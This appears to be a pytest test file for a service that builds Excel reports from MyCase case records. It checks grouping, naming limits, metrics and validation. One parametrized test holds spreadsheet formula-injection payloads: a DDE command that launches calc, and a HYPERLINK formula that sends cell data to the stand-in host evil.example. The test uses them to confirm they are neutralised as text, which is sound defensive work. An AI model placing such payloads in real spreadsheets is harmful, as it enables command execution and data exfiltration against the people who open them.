"""Tests for app/services/report_builder.py.

These run entirely on synthetic rows — no MyCase account, no network — which is
deliberate: end-to-end agent runs against the real account take minutes, so the
edge cases that actually break real reports (Excel's naming limits, formula
injection, ragged/mixed-type data) are proven here instead.
"""
from __future__ import annotations

from io import BytesIO

import pytest
from openpyxl import load_workbook

from app.services.report_builder import (
    build_workbook,
    suggest_filename,
    validate_spec,
)


def _load(payload: bytes):
    return load_workbook(BytesIO(payload))


def _rows(n: int = 6) -> list[dict]:
    attorneys = ["LANA JOSEPH", "EDDY LAGUERRE", "LANA JOSEPH", "(unassigned)", "LANA JOSEPH", "EDDY LAGUERRE"]
    return [
        {
            "id": 100 + i,
            "case_number": f"CASE-{i:04d}",
            "name": f"Matter {i}",
            "assigned_attorney": attorneys[i % len(attorneys)],
            "outstanding_balance": f"{(i + 1) * 100}.50",  # MyCase returns money as STRINGS
        }
        for i in range(n)
    ]


# ── the headline scenario ────────────────────────────────────────────────────


def test_summary_plus_one_sheet_per_group():
    """The exact request that motivated this module: a per-attorney breakdown
    plus one detail sheet per attorney."""
    payload, meta = build_workbook(
        _rows(),
        {
            "title": "Active cases by attorney",
            "summary": {"group_by": "assigned_attorney", "metrics": [{"op": "count"}]},
            "detail_sheets": {"split_by": "assigned_attorney", "columns": ["case_number", "name"]},
        },
    )
    workbook = _load(payload)

    assert workbook.sheetnames[0] == "Summary"
    # One tab per distinct attorney, plus Summary.
    assert set(workbook.sheetnames) == {"Summary", "LANA JOSEPH", "EDDY LAGUERRE", "(unassigned)"}
    assert meta["sheet_count"] == 4
    assert meta["row_count"] == 6
    assert meta["group_count"] == 3

    # Summary is sorted biggest-group-first by default.
    assert [r["name"] for r in meta["summary"]] == ["LANA JOSEPH", "EDDY LAGUERRE", "(unassigned)"]
    assert [r["count"] for r in meta["summary"]] == [3, 2, 1]

    # A detail sheet holds exactly its own group's rows (+1 header row).
    assert _load(payload)["LANA JOSEPH"].max_row == 4


def test_detail_rows_land_on_the_right_sheet():
    payload, _ = build_workbook(
        _rows(),
        {
            "summary": {"group_by": "assigned_attorney", "metrics": [{"op": "count"}]},
            "detail_sheets": {"split_by": "assigned_attorney", "columns": ["case_number", "assigned_attorney"]},
        },
    )
    sheet = _load(payload)["EDDY LAGUERRE"]
    values = [row[1].value for row in sheet.iter_rows(min_row=2)]
    assert values and all(v == "EDDY LAGUERRE" for v in values)


# ── security: spreadsheet formula injection ──────────────────────────────────


@pytest.mark.parametrize(
    "payload_text",
    [
        "=cmd|'/c calc'!A1",
        "+1+1",
        "-1+1",
        "@SUM(1+1)",
        '=HYPERLINK("http://evil.example/?d="&A1,"click")',
    ],
)
def test_formula_injection_is_neutralised(payload_text: str):
    """Cell text comes from client-written MyCase records. Excel executes any
    cell starting with = + - @ (OWASP CWE-1236), so every string cell must be
    pinned to a text type — while still displaying its original characters."""
    payload, _ = build_workbook(
        [{"name": payload_text, "grp": "g"}],
        {"detail_sheets": {"split_by": "grp", "columns": ["name"]}},
    )
    cell = _load(payload)["g"].cell(row=2, column=1)
    assert cell.data_type == "s", f"{payload_text!r} was not stored as text"
    assert cell.value == payload_text, "the literal text must survive intact"


def test_formula_injection_in_a_sheet_name_is_neutralised():
    """A group VALUE becomes a sheet name — it must not smuggle illegal chars."""
    payload, _ = build_workbook(
        [{"grp": "a/b:c*d?e[f]g", "x": 1}],
        {"detail_sheets": {"split_by": "grp", "columns": ["x"]}},
    )
    assert _load(payload).sheetnames == ["a-b-c-d-e-f-g"]


# ── Excel's naming limits ────────────────────────────────────────────────────


def test_long_sheet_name_is_truncated_to_31_chars():
    long_name = "Immigration Asylum Defense Team Alpha Bravo Charlie"
    payload, _ = build_workbook(
        [{"grp": long_name, "x": 1}],
        {"detail_sheets": {"split_by": "grp", "columns": ["x"]}},
    )
    (sheet_name,) = _load(payload).sheetnames
    assert len(sheet_name) <= 31
    assert sheet_name == long_name[:31]


def test_names_colliding_after_truncation_are_de_duplicated():
    """Two genuinely different groups sharing a 31-char prefix must not collapse
    into one sheet — that would silently merge two clients' data."""
    a = "Immigration Asylum Defense Team NORTH"
    b = "Immigration Asylum Defense Team SOUTH"
    payload, meta = build_workbook(
        [{"grp": a, "x": 1}, {"grp": b, "x": 2}],
        {
            "summary": {"group_by": "grp", "metrics": [{"op": "count"}]},
            "detail_sheets": {"split_by": "grp", "columns": ["x"]},
        },
    )
    names = [n for n in _load(payload).sheetnames if n != "Summary"]
    assert len(names) == 2, "collision must produce two distinct sheets"
    assert len(set(names)) == 2
    assert all(len(n) <= 31 for n in names)
    # And the user is told the names were shortened.
    assert any("31-character" in note for note in meta["notes"])


def test_blank_group_values_collapse_into_one_explicit_bucket():
    """None / "" / whitespace must not fan out into several ghost groups."""
    payload, meta = build_workbook(
        [{"grp": None, "x": 1}, {"grp": "", "x": 2}, {"grp": "   ", "x": 3}, {"grp": "real", "x": 4}],
        {
            "summary": {"group_by": "grp", "metrics": [{"op": "count"}]},
            "detail_sheets": {"split_by": "grp", "columns": ["x"]},
        },
    )
    assert meta["group_count"] == 2
    assert {r["name"] for r in meta["summary"]} == {"(none)", "real"}
    assert "(none)" in _load(payload).sheetnames


# ── caps are disclosed, never silent ─────────────────────────────────────────


def test_sheet_cap_limits_tabs_but_summary_keeps_every_group():
    """Grouping this account's real cases by client produced 4,796 groups. The
    workbook caps detail TABS, but the Summary must still account for all of
    them, and the cap must be stated — never silently truncated."""
    rows = [{"grp": f"client-{i}", "x": i} for i in range(25)]
    payload, meta = build_workbook(
        rows,
        {
            "summary": {"group_by": "grp", "metrics": [{"op": "count"}]},
            "detail_sheets": {"split_by": "grp", "columns": ["x"], "max_detail_sheets": 5},
        },
    )
    workbook = _load(payload)
    assert len(workbook.sheetnames) == 6  # Summary + 5 detail tabs
    assert meta["group_count"] == 25, "every group is still counted"
    assert meta["sheet_count"] == 6
    assert any("25 groups matched" in note for note in meta["notes"])
    # The Summary sheet itself lists all 25 groups (4 preamble rows + header).
    assert workbook["Summary"].max_row == 5 + 25


def test_summary_returned_to_the_caller_is_capped_and_says_so():
    rows = [{"grp": f"g{i}", "x": 1} for i in range(120)]
    _, meta = build_workbook(rows, {"summary": {"group_by": "grp", "metrics": [{"op": "count"}]}})
    assert len(meta["summary"]) == 50
    assert meta["group_count"] == 120
    assert any("top 50 of 120 groups" in note for note in meta["notes"])


# ── metrics over real-world ragged data ──────────────────────────────────────


def test_string_money_values_are_summed_numerically():
    """MyCase returns total_amount/paid_amount as STRINGS on real invoices — a
    documented quirk that has caused arithmetic bugs before."""
    _, meta = build_workbook(
        [{"grp": "a", "amt": "100.50"}, {"grp": "a", "amt": 99.5}, {"grp": "a", "amt": None}],
        {"summary": {"group_by": "grp", "metrics": [{"op": "sum", "column": "amt"}, {"op": "avg", "column": "amt"}]}},
    )
    row = meta["summary"][0]
    assert row["sum of amt"] == 200.0
    assert row["avg of amt"] == 100.0, "None must be skipped, not counted as zero"


def test_decimal_strings_become_numeric_cells_but_identifiers_stay_text():
    """"500.0" should be summable in Excel; "0012" must keep its leading zero and
    a long digit run must not turn into scientific notation."""
    payload, _ = build_workbook(
        [{"grp": "g", "amount": "500.0", "code": "0012", "phone": "5551234567"}],
        {"detail_sheets": {"split_by": "grp", "columns": ["amount", "code", "phone"]}},
    )
    sheet = _load(payload)["g"]
    assert sheet.cell(row=2, column=1).value == 500.0
    assert sheet.cell(row=2, column=2).value == "0012"
    assert sheet.cell(row=2, column=3).value == "5551234567"


def test_count_distinct_and_min_max():
    _, meta = build_workbook(
        [{"g": "a", "v": 5, "who": "x"}, {"g": "a", "v": 1, "who": "x"}, {"g": "a", "v": 9, "who": "y"}],
        {
            "summary": {
                "group_by": "g",
                "metrics": [
                    {"op": "count_distinct", "column": "who"},
                    {"op": "min", "column": "v"},
                    {"op": "max", "column": "v"},
                ],
            }
        },
    )
    row = meta["summary"][0]
    assert row["count_distinct of who"] == 2
    assert row["min of v"] == 1.0
    assert row["max of v"] == 9.0


def test_sorting_survives_mixed_and_missing_types():
    """Real columns are ragged — a null date beside a string beside a number.
    Python 3 raises on `1 < "a"`, so a naive sort would kill the whole report."""
    payload, _ = build_workbook(
        [{"g": "x", "v": 3}, {"g": "x", "v": None}, {"g": "x", "v": "abc"}, {"g": "x", "v": 1}],
        {"detail_sheets": {"split_by": "g", "columns": ["v"], "sort": {"by": "v", "dir": "asc"}}},
    )
    values = [r[0].value for r in _load(payload)["x"].iter_rows(min_row=2)]
    assert values[:2] == [1, 3], "numbers sort first and numerically"
    assert values[2] == "abc", "text sorts after numbers"
    # An empty value is written as a blank cell, which openpyxl reads back as None.
    assert values[3] is None, "empties sort last"


def test_nested_objects_flatten_like_the_frontend_does():
    payload, _ = build_workbook(
        [{"g": "x", "client": {"first_name": "Ada", "last_name": "Lovelace", "email": "ada@example.com"},
          "staff": [{"first_name": "Bo"}, {"first_name": "Cy"}], "case": {"id": 42}}],
        {"detail_sheets": {"split_by": "g", "columns": ["client", "staff", "case"]}},
    )
    row = next(_load(payload)["x"].iter_rows(min_row=2, values_only=True))
    assert row[0] == "Ada Lovelace <ada@example.com>"
    assert row[1] == "Bo; Cy"
    assert row[2] == 42


def test_ragged_rows_auto_derive_the_union_of_columns():
    payload, _ = build_workbook(
        [{"g": "x", "a": 1}, {"g": "x", "b": 2}],
        {"detail_sheets": {"split_by": "g"}},  # no explicit columns
    )
    header = next(_load(payload)["x"].iter_rows(max_row=1, values_only=True))
    assert set(header) == {"g", "a", "b"}


# ── spec validation ──────────────────────────────────────────────────────────


def test_empty_spec_is_rejected_with_an_actionable_message():
    with pytest.raises(ValueError, match="at least one of 'summary'"):
        validate_spec({})


def test_metric_needing_a_column_says_so():
    with pytest.raises(ValueError, match="requires a 'column'"):
        validate_spec({"summary": {"group_by": "g", "metrics": [{"op": "sum"}]}})


def test_unknown_metric_op_lists_the_valid_ones():
    with pytest.raises(ValueError, match="count_distinct"):
        validate_spec({"summary": {"group_by": "g", "metrics": [{"op": "median", "column": "v"}]}})


def test_summary_without_group_by_is_rejected():
    with pytest.raises(ValueError, match="group_by is required"):
        validate_spec({"summary": {"metrics": [{"op": "count"}]}})


def test_no_rows_is_an_explicit_error_not_an_empty_workbook():
    """An empty workbook would read as 'there is no data', which may be false —
    it usually means the report was built before the data was fetched."""
    with pytest.raises(ValueError, match="no rows to report on"):
        build_workbook([], {"summary": {"group_by": "g", "metrics": [{"op": "count"}]}})


# ── misc ─────────────────────────────────────────────────────────────────────


def test_detail_only_report_without_split_puts_everything_on_one_sheet():
    payload, meta = build_workbook(
        _rows(4), {"detail_sheets": {"columns": ["case_number"]}}
    )
    assert _load(payload).sheetnames == ["Data"]
    assert meta["sheet_count"] == 1


def test_suggest_filename_is_safe_and_stamped():
    name = suggest_filename("Active cases by attorney / Q3")
    assert name.startswith("active-cases-by-attorney-q3_")
    assert name.endswith(".xlsx")
    assert not set(name) & set('\\/:*?"<>|')
